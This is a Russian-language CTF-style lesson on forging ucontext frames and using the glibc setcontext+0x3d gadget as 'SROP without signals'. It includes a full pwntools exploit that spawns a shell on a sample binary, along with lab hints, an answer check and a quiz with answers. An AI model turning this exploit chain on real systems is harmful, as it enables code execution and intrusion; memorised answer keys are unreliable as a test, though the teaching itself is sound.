---
id: pwn-signal-frame-forgery
title: "Подделка сигнальных фреймов и setcontext-цепочки"
category: pwn
parent: pwn-signal-handlers
difficulty: expert
order: 2
tags: [srop, ucontext, setcontext, sigframe, fsop, glibc]
prerequisites: [pwn-sigreturn-exploit]
useful_for:
  - "CTF Pwn категория"
  - "Modern glibc exploitation"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Учимся подделывать ucontext и использовать setcontext+0x35 как «SROP без сигналов», обходить проверки ядра и связывать с FSOP."
lab:
  kind: shell
  title: "Практика: setcontext-гаджет"
  toolset: [core]
  workdir: /home/student/task
  files: [task.md, setcontext.txt]
  check: "grep -q 'gadget=0x4408d' answer.txt"
  hints:
    - "`grep rsp setcontext.txt` — ищи инструкцию загрузки `rsp`."
    - "Это `mov 0xa0(%rdx),%rsp` — поле RSP из ucontext."
    - "Возьми абсолютный адрес этой инструкции из первой колонки."
---

## Вопрос, с которого всё начинается

В уроке `pwn-sigreturn-exploit` мы подделывали сигнальный фрейм и через системный вызов `rt_sigreturn` (номер 15) загружали сразу все регистры — приём SROP. Но у него есть условие: программа должна получать сигналы. А если сигналов нет вовсе? Оказывается, «SROP без сигналов» возможен — через функцию `setcontext`.

## Наш пример: бинарь chall

Нам дали бинарь с переполнением стека и утечкой адреса libc. Смотрим, что это за файл:

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

```
$ checksec ./chall
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Разбираем по-простому:

- `No PIE` — адреса в самом бинаре фиксированы (0x400000…), ASLR их не двигает.
- `NX enabled` — стек помечен как неисполняемый: положить туда шеллкод и прыгнуть нельзя.
- `No canary` — на стеке нет «сторожа», который ловит перезапись обратного адреса.

Значит, переполнение есть, но исполнять придётся существующий код — это называется ROP (return-oriented programming): собираем цепочку из маленьких кусочков кода, заканчивающихся `ret`. Чтобы вызвать `system("/bin/sh")`, обычно нужны такие кусочки-гаджеты (`pop rdi; ret` и подобные). А что, если удобных гаджетов нет, но адрес libc мы уже знаем из утечки?

## Шаг 1. Что такое ucontext

`ucontext_t` — структура из POSIX-API, описывающая «состояние процесса»: где стоит стек, какие значения в регистрах, куда прыгать дальше. Внутри неё лежит `mcontext_t`, а в нём — массив `gregs[]` с регистрами по фиксированным смещениям. Функция `setcontext(ucp)` читает эту структуру и переключает на неё контекст.

Ключевое наблюдение: `setcontext` загружает регистры из памяти, которую мы контролируем, — ровно то же, что делает ядро по `rt_sigreturn`. Только сигнал для этого не нужен.

## Шаг 2. Гаджет setcontext+0x3d

Найдём `setcontext` в libc:

```
$ readelf -sW /usr/lib/libc.so.6 | grep setcontext
  2620: 0000000000044050   352 FUNC  WEAK  DEFAULT   13 setcontext@@GLIBC_2.2.5
```

Символ по смещению `0x44050`. Посмотрим на код рядом:

```
$ objdump -d --start-address=0x4408d --stop-address=0x440c0 /usr/lib/libc.so.6
000000000004408d <setcontext@@GLIBC_2.2.5+0x3d>:
   4408d:  mov  0xa0(%rdx),%rsp
   44094:  mov  0x80(%rdx),%rbx
   4409b:  mov  0x78(%rdx),%rbp
   4409f:  mov  0x48(%rdx),%r12
   440a3:  mov  0x50(%rdx),%r13
   440a7:  mov  0x58(%rdx),%r14
   440ab:  mov  0x60(%rdx),%r15
```

Важно: этот фрагмент берёт контекст из `rdx` (а не из `rdi`, как обычный вызов `setcontext`). По смещению `+0x3d` начинается последовательность, которая грузит `rsp` из `[rdx+0xa0]`, а чуть дальше — `rdi` из `[rdx+0x68]` и `rip` из `[rdx+0xa8]`. Если прыгнуть точно на `setcontext+0x3d`, мы пропустим `fldenv` и `ldmxcsr` (они выше по адресу) и получим «загрузчик регистров из указателя в `rdx`».

Смещение можно найти и автоматически, по байтам:

```
>>> from pwn import *
>>> l = ELF('/usr/lib/libc.so.6')
>>> hex(l.sym['setcontext'])
'0x44050'
>>> hex(next(l.search(asm('mov rsp, [rdx+0xa0]'))))
'0x4408d'
```

`asm('mov rsp, [rdx+0xa0]')` собирает байты инструкции, а `l.search` ищет их в libc. Так гаджет находится даже в stripped-сборке, где символов нет.

## Шаг 3. Собираем фрейм в pwntools

Раскладка контекста уже описана в pwntools — класс `SigreturnFrame`. Его поля совпадают с ожиданиями `setcontext` (проверено на glibc 2.43):

```
>>> f = SigreturnFrame()
>>> f.rip = 0x401234      # куда прыгнуть
>>> f.rdi = 0x404160      # первый аргумент
>>> f.rsp = 0x423068      # новый стек
>>> len(bytes(f))
248
```

`f.rip` — адрес, на который произойдёт переход; `f.rdi` — первый аргумент функции; `f.rsp` — стек. Именно поэтому `setcontext` удобен: одной структурой мы задаём всё, что для `system("/bin/sh")` собирали бы десятком гаджетов.

## Шаг 4. Полный эксплойт

План: переполнением перезаписать обратный адрес; выставить `rdx` на наш фрейм; прыгнуть в `setcontext+0x3d`. Чистого `pop rdx; ret` в этой libc нет, поэтому `rdx` выставим через `pop rax` + `mov rdx, rax`.

```python
from pwn import *
elf  = ELF('./chall'); libc = ELF('/usr/lib/libc.so.6')
p = process('./chall')

leak = u64(p.recvn(8))                 # утечка адреса write
libc.address = leak - libc.sym['write']

pop_rax     = libc.address + 0xd47d7   # pop rax; ret
mov_rdx_rax = libc.address + 0x127d87  # mov rdx, rax; ret
setcontext  = libc.address + 0x4408d   # setcontext+0x3d
system      = libc.sym['system']       # уже релоцирован (libc.address задан)

UBUF = elf.sym['ubuf']
chain = flat(pop_rax, UBUF, mov_rdx_rax, setcontext)
p.recvuntil(b'> ')
p.send(flat({0x108: chain}).ljust(0x300, b'\x00'))

f = SigreturnFrame(); f.rip = system; f.rdi = UBUF + 0x100
f.rsp = (UBUF + 0x1f000) & ~0xf | 8
p.send((bytes(f).ljust(0x100, b'A') + b'/bin/sh\x00').ljust(0x400, b'B'))
p.recvuntil(b'bye\n')
p.sendline(b'id')
p.interactive()
```

Фрейм мы кладём в `.bss` (`ubuf`), туда же — строку `/bin/sh`. А `rsp` направляем внутрь большого буфера в `.bss`: `system` вызывает вложенные функции и активно пользуется стеком, поэтому крошечного участка не хватит.

Запускаем:

```
$ python3 exploit.py
[*] write @ 0x7f8004879de0
[*] libc base @ 0x7f800476c000
[*] setcontext+0x3d = 0x7f80047b008d
[*] Switching to interactive mode
SHELL_OK
uid=1000(user) gid=1000(user) groups=1000(user)
```

Оболочка получена. `setcontext+0x3d` восстановил регистры из нашего фрейма и передал управление в `system` — без единого сигнала.

## Если не сработало

- **Нет `pop rdx; ret`.** В современных libc его часто нет. Возьми `pop rax; ret` + `mov rdx, rax; ret` или `pop rdx; pop rcx; …`.
- **`movaps` падает.** `system` использует инструкцию `movaps`, требующую 16-байтового выравнивания. `rsp` на входе должен давать `mod 16 == 8` (как после `call`).
- **Стек-«песочница» мала.** Не направляй `rsp` в крошечный `.bss`: вложенные вызовы уйдут ниже и словят невалидную страницу.
- **Гаджет в read-only сегменте.** `ELF.search` ищет по всему файлу; проверь, что смещение попадает в исполняемую секцию (`.text`), иначе SIGSEGV на первом же `pop`.
- **glibc 2.29+.** Смещение `+0x3d`/`+0x35` зависит от версии — сверяйся с дизассемблером своей libc.

## Что мы теперь знаем

- `ucontext_t` хранит регистры и стек; `setcontext` их восстанавливает.
- `setcontext+0x3d` берёт контекст из `rdx` — «SROP без сигналов».
- Один указатель в `rdx` плюс фрейм заменяют длинную ROP-цепочку.
- `rdx` выставляется через `pop rax` + `mov rdx, rax`.
- Стек под `system` должен быть выровнен и достаточно велик.

## На что смотреть дальше

- **Смещение гаджета.** Оно своё для каждой версии glibc.
- **Откуда берётся `rdx`.** Нет `pop rdx` — ищи обходные пути.
- **Выравнивание `rsp`.** Первая причина падений в `movaps`.
- **Размер стека.** `.bss`-буфер должен вместить вложенные вызовы.
- **Секция гаджета.** Только `.text` исполняема.

## Квиз

Проверь себя.

```quiz
- question: "Откуда гаджет setcontext+0x3d берёт указатель на контекст?"
  options:
    - "Из rdi"
    - "Из rdx"
    - "Из rsp"
    - "Из rax"
  answer: 1
  explanation: "В отличие от обычного setcontext, этот фрагмент читает структуру по rdx."
- question: "Почему прыгают именно на setcontext+0x3d, а не на начало функции?"
  options:
    - "Чтобы пропустить fldenv и ldmxcsr и сразу грузить rsp"
    - "Потому что начало не исполняется"
    - "Чтобы отключить ASLR"
    - "Чтобы снять canary"
  answer: 0
  explanation: "Начало функции делает лишние операции с FPU-состоянием, которого у нас нет."
- question: "Что задаёт поле f.rip в SigreturnFrame?"
  options:
    - "Адрес, куда перейдёт управление после загрузки регистров"
    - "Первый аргумент функции"
    - "Размер фрейма"
    - "Новый стек"
  answer: 0
  explanation: "rip — это адрес следующей инструкции, то есть точка перехода."
- question: "Зачем rsp направляют в большой буфер .bss, а не в маленький?"
  options:
    - "Чтобы system и вложенные вызовы не вышли за валидную память"
    - "Чтобы ускорить эксплойт"
    - "Чтобы включить PIE"
    - "Чтобы обойти seccomp"
  answer: 0
  explanation: "Вложенные вызовы активно используют стек и уходят вниз по адресам."
- question: "Какое требование к rsp на входе в system критично для movaps?"
  options:
    - "16-байтовое выравнивание (mod 16 == 8)"
    - "Чётность"
    - "rsp должен быть нулём"
    - "rsp должен указывать на код"
  answer: 0
  explanation: "movaps падает на невыровненном адресе."
```

## Куда дальше

В `pwn-async-signal-race` мы посмотрим на сигналы с другой стороны: как обработчик, делающий `longjmp`, ломает порядок исполнения и создаёт гонку. А пока главное: **`setcontext+0x3d` превращает один контролируемый указатель в полный контроль над регистрами — это «SROP без сигналов».**

## Где пригодится

- **CTF:** heap/stack-эксплойты, где нужен контроль над `rsp` и регистрами одним приёмом.
- **Real-world:** FSOP и цепочки в modern glibc (`setcontext` — классический финальный шаг).
- **Bug bounty:** обход нехватки гаджетов в свежих libc.
- **Работа:** понимание `ucontext` и переключения контекста в планировщиках и корутинах.
